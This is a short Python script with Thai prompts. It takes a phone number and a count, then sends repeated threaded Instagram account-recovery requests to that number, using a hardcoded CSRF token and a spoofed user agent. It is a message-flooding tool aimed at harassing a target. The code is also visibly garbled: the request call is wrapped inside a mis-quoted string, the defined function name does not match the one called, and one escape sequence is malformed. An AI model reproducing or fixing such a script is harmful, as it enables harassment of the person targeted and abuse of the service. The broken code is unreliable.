 import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
os.system("clear")
print("")

phone = input("\33[1;91mเบอร์ : ")
jam = int(input("\33[1;96mจำนวน : "))
print("")

def api1():
	requests.post("requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json")
print("\33]1;94mยิงแล้วครับ ")
	
for i in range(jam):
	time.sleep(1)
	threading.Thread(target=API1).start()